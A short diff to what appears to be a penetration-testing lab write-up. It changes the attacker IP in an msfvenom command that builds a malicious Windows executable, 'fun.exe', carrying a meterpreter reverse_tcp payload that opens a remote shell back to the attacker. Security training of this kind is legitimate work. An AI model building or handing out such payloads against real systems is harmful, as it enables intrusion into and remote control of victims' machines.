@@ -29,7 +29,7 @@ Find the attackers ip address using ifconfig
 ![Alt text](img/ifconfig.png)
 
 Create a malicious executable file fun.exe using msfvenom command
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.228.13 -f exe > fun.exe
 ## OUTPUT:
 ![Alt text](img/msvenom.png)
 ![Alt text](img/venom2.png)
